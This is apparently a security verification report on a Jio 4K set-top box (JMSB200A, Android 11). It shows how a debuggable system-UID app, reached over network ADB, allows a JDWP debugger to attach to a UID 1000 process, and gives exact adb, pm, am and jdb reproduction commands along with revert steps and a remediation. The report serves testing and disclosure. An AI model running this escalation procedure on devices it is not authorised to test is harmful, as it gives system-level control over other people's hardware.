# JDWP System-UID Escalation — Verification Findings

**Device:** Jio 4K STB `JMSB200A` (Skyworth `5800-2AHP44T`, Amlogic S905X4)
**Firmware:** Android 11 (API 30), build `25.1.9`, `ro.build.type=user`
**ADB target:** `192.168.2.137:5555` (network ADB, port hardcoded in `vendor/build.prop`)
**Date:** 2026-10-26
**Source guide:** [`ROOT_ADB_CUSTOM_ROM_GUIDE.md`](./ROOT_ADB_CUSTOM_ROM_GUIDE.md) §2 Approach B — "Local Privilege Escalation via Debuggable System App"

---

## 1. Target app

| Field | Value |
|---|---|
| Package | `com.rjil.jio.stb.commandreceiver` |
| APK path | `/system/priv-app/JioCommandReceiver` (base.apk) |
| Version | `1.0` (versionCode 1), minSdk 28, targetSdk 33 |
| ABI | `armeabi-v7a` |
| `sharedUserId` | `android.uid.system` |
| Effective UID/GID | `1000` / `1000` (system) |
| Manifest flags | `SYSTEM DEBUGGABLE HAS_CODE PERSISTENT ALLOW_CLEAR_USER_DATA ALLOW_BACKUP` |
| Receiver | `com.rjil.jio.stb.commandreceiver/.JioCommandReceiver` |
| Receiver action | `com.jio.myhome.mediasharedmp.intent.action.ACTIVITY_LAUNCH` |
| Permission required to trigger | `com.jio.stb.permission.LAUNCH_ACTIVITY` (held by `com.jio.stb.jioservice`, not by `shell`) |

The app ships as a **debuggable system/priv-app in production firmware**, which is the core weakness: any holder of ADB access can attach a Java debugger (JDWP) to its process and execute code in the `system` (UID 1000) context.

## 2. Reproduction steps (as performed)

1. Confirm ADB session:
   ```bash
   adb devices
   # 192.168.2.137:5555   device
   ```
2. Inspect package state — initially `stopped=true`, `notLaunched=true`, `enabled=0`, `installed=false` for user 0:
   ```bash
   adb shell dumpsys package com.rjil.jio.stb.commandreceiver
   ```
3. Enable the package (was disabled):
   ```bash
   adb shell pm enable com.rjil.jio.stb.commandreceiver
   ```
4. Install for the current user (was not installed for user 0):
   ```bash
   adb shell pm install-existing com.rjil.jio.stb.commandreceiver
   ```
5. Trigger the receiver so its process starts (runs as UID 1000):
   ```bash
   adb shell am broadcast -n com.rjil.jio.stb.commandreceiver/.JioCommandReceiver \
       -a com.jio.myhome.mediasharedmp.intent.action.ACTIVITY_LAUNCH
   ```
   Resulting process:
   ```
   system  14014  374  ...  S  com.rjil.jio.stb.commandreceiver
   Uid: 1000 1000 1000 1000
   ```
6. Forward JDWP and attach `jdb`:
   ```bash
   adb forward tcp:8700 jdwp:$(adb shell pidof com.rjil.jio.stb.commandreceiver)
   printf 'version\nthreads\nquit\n' | jdb -attach localhost:8700
   ```
   `jdb` reported `JVM version 8 (Dalvik)` and listed all process threads (Signal Catcher, Binder threads, main, Finalizer daemon, etc.) — confirming live debug control over the system-UID process.

## 3. Result

- **JDWP attach: SUCCESS.** Full debug visibility into a process running as `android.uid.system` (UID 1000).
- **Arbitrary code execution via `jdb eval`: NOT demonstrated.** `jdb`'s expression parser is limited on Dalvik and could not resolve `System.getProperty(...)`. Real code execution as system would require a JDWP-aware client (e.g., reflection-based invocation or a shellifier-style tool) rather than interactive `jdb eval`.
- **Conclusion:** The escalation *path* (ADB → debuggable system app → JDWP attach) is functional on this firmware, but weaponized code execution was not performed. The device's security posture is confirmed vulnerable to this vector.

## 4. Changes made to the device (all reverted)

The following state changes were made during testing and are reverted in the same session:

| Change | Revert command |
|---|---|
| `pm enable com.rjil.jio.stb.commandreceiver` | `pm disable com.rjil.jio.stb.commandreceiver` (or `pm disable-user`) |
| `pm install-existing com.rjil.jio.stb.commandreceiver` | `pm uninstall --user 0 com.rjil.jio.stb.commandreceiver` |

No APKs were installed, no files were written to `/data`, and no settings beyond the package's enabled/installed state were modified. The broadcast-triggered process is transient and terminates on its own (or via `am force-stop`).

## 5. Security note

Because `JioCommandReceiver.apk` is a `DEBUGGABLE` system app in a `user` build, any party with ADB access can gain `system` (UID 1000) code-execution capability. Combined with the network ADB listener on port 5555 (`service.adb.tcp.port`), this is a serious local/physical-access vulnerability. Recommended remediation: remove `android:debuggable="true"` from the manifest and rebuild, or remove the app from `/system/priv-app` in production images.

---
## 🔗 Related Documents

| Related Document | Relationship |
| :--- | :--- |
| [`ROOT_ADB_CUSTOM_ROM_GUIDE.md`](ROOT_ADB_CUSTOM_ROM_GUIDE.md) | §2 Approach B — Local Privilege Escalation via Debuggable System App (procedure summary). |
| [`TR069_REMOTE_ADB_ANALYSIS.md`](TR069_REMOTE_ADB_ANALYSIS.md) | Network ADB prerequisite on port 5555 required before JDWP attach can be performed. |
| [`jio_infrastructure/10_PRIVILEGED_APKS_AND_IPC_CATALOG.md`](jio_infrastructure/10_PRIVILEGED_APKS_AND_IPC_CATALOG.md) | `JioCommandReceiver.apk` catalog entry: declared permissions, AIDL interfaces, and system-service role. |
| [`jio_infrastructure/11_SECURITY_AUDIT_AND_ATTACK_SURFACE.md`](jio_infrastructure/11_SECURITY_AUDIT_AND_ATTACK_SURFACE.md) | §2.6 — Privileged activity-launch trampoline vulnerability in `JioCommandReceiver.apk` (system-UID `startActivity` bypass). |
